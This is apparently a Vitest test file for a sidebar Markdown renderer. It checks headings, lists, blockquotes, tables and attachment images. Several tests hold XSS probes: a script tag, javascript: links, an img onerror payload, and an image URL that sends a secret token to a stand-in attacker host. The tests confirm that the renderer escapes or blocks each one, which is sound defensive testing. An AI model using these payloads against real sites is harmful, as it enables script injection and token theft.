import { describe, expect, it } from "vitest";
// @ts-expect-error 浏览器端模块没有单独的类型声明，测试仅调用纯函数导出。
import { renderMarkdown } from "../../src/public/markdown.js";

describe("侧边栏 Markdown 渲染", () => {
  it("渲染标题、强调、列表、链接和代码块", () => {
    const html = renderMarkdown("## 作品信息\n\n**类型**：科幻\n\n- 星际探索\n- 新角色\n\n[资料](https://example.com)\n\n```js\nconst answer = 42;\n```");
    expect(html).toContain("<h2>作品信息</h2>");
    expect(html).toContain("<strong>类型</strong>");
    expect(html).toContain("<ul><li");
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('<pre><code class="language-js">const answer = 42;</code></pre>');
  });

  it("转义 HTML 并拒绝脚本链接", () => {
    const html = renderMarkdown('<script>alert("x")</script>\n\n[危险](javascript:alert(1))');
    expect(html).toContain("&lt;script&gt;");
    expect(html).not.toContain("<script>");
    expect(html).not.toContain('href="javascript:');
  });

  it("渲染单反引号与双反引号行内代码", () => {
    const html = renderMarkdown("`单反引号` 与 ``包含 ` 的代码``，以及 ``222222`` 我喜欢你");

    expect(html).toContain("<code>单反引号</code>");
    expect(html).toContain("<code>包含 ` 的代码</code>");
    expect(html).toContain("<code>222222</code> 我喜欢你");
    expect(html).not.toContain("``222222``");
  });

  it("将连续引用行合并为一个引用块", () => {
    const html = renderMarkdown('> "第一句"\n>\n> "第二句"\n> "第三句"');

    expect(html).toBe('<blockquote>&quot;第一句&quot;<br><br>&quot;第二句&quot;<br>&quot;第三句&quot;</blockquote>');
    expect(html.match(/<blockquote>/gu)).toHaveLength(1);
    expect(html).not.toContain("<blockquote></blockquote>");
  });

  it("单个空行继续合并引用块，两个空行才切分", () => {
    const merged = renderMarkdown("> 第一段\n\n> 第二段\n\n> 第三段");
    expect(merged).toBe("<blockquote>第一段<br><br>第二段<br><br>第三段</blockquote>");
    expect(merged.match(/<blockquote>/gu)).toHaveLength(1);

    const separated = renderMarkdown("> 第一块\n\n\n> 第二块");
    expect(separated).toBe("<blockquote>第一块</blockquote><blockquote>第二块</blockquote>");
    expect(separated.match(/<blockquote>/gu)).toHaveLength(2);
  });

  it("跨空行的有序与无序列表合并为单个列表", () => {
    const ordered = renderMarkdown("1. **相遇**：初见。\n\n2. **承诺**：约定。\n\n3. **幻灭**：失望。");
    expect(ordered.match(/<ol>/gu)).toHaveLength(1);
    expect(ordered.match(/<\/ol>/gu)).toHaveLength(1);
    expect(ordered).toContain("<li class=\"markdown-depth-0\"><strong>相遇</strong>：初见。</li>");
    expect(ordered).toContain("<li class=\"markdown-depth-0\"><strong>承诺</strong>：约定。</li>");
    expect(ordered).toContain("<li class=\"markdown-depth-0\"><strong>幻灭</strong>：失望。</li>");

    const unordered = renderMarkdown("- 甲\n\n- 乙\n\n- 丙");
    expect(unordered.match(/<ul>/gu)).toHaveLength(1);
    expect(unordered).toContain("<li class=\"markdown-depth-0\">甲</li>");
    expect(unordered).toContain("<li class=\"markdown-depth-0\">乙</li>");
    expect(unordered).toContain("<li class=\"markdown-depth-0\">丙</li>");
  });

  it("空行后若不再是同类型列表则结束当前列表", () => {
    const html = renderMarkdown("1. 第一项\n\n不是列表\n\n- 无序项");
    expect(html).toContain("</ol><p>不是列表</p><ul>");
    expect(html.match(/<ol>/gu)).toHaveLength(1);
    expect(html.match(/<ul>/gu)).toHaveLength(1);
  });

  it("渲染带对齐方式的表格并保留单元格内的管道符", () => {
    const html = renderMarkdown("| 章节 | 标题 | 内容摘要 |\n| :--- | :---: | ---: |\n| 第一百六十三章 | **护盾实验** | `能量 | 护盾` |\n| 第一百六十四章 | 海洋星舰 | 哥斯拉\\|机械哥斯拉 | ");

    expect(html).toContain('<div class="markdown-table-scroll" role="region" aria-label="Markdown 表格" tabindex="0">');
    expect(html).toContain('<th class="markdown-align-left" data-markdown-table-header tabindex="0" aria-haspopup="menu" title="右键或按 Shift+F10 设置表格换行">章节</th>');
    expect(html).toContain('<th class="markdown-align-center" data-markdown-table-header tabindex="0" aria-haspopup="menu" title="右键或按 Shift+F10 设置表格换行">标题</th>');
    expect(html).toContain('<td class="markdown-align-center"><strong>护盾实验</strong></td>');
    expect(html).toContain('<td class="markdown-align-right"><code>能量 | 护盾</code></td>');
    expect(html).toContain('<td class="markdown-align-right">哥斯拉|机械哥斯拉</td>');
  });

  it("转义表格单元格中的 HTML", () => {
    const html = renderMarkdown("| 名称 | 内容 |\n| --- | --- |\n| 测试 | <img src=x onerror=alert(1)> |");

    expect(html).toContain("&lt;img src=x onerror=alert(1)&gt;");
    expect(html).not.toContain("<img");
  });

  it("渲染内部附件图片并拒绝不安全图片地址", () => {
    const html = renderMarkdown("###### 档案图\n\n![魔克拉](attachment://attachment_safe-1)\n\n![危险](javascript:alert(1))\n\n![追踪](https://attacker.test/collect?secret=token)");

    expect(html).toContain("<h6>档案图</h6>");
    expect(html).toContain('src="/api/attachments/attachment_safe-1/content"');
    expect(html).toContain('alt="魔克拉"');
    expect(html).not.toContain('src="javascript:');
    expect(html).toContain("[外部图片已阻止：追踪]");
    expect(html).not.toContain("attacker.test");
  });
});
